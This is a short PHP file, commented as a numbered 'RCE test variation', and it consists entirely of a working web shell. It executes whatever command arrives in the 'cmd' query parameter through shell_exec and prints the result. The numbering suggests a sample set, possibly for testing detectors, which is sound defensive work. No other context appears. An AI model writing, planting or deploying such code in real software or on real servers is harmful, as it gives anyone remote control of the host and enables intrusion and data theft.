<?php
// RCE test variation #213
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>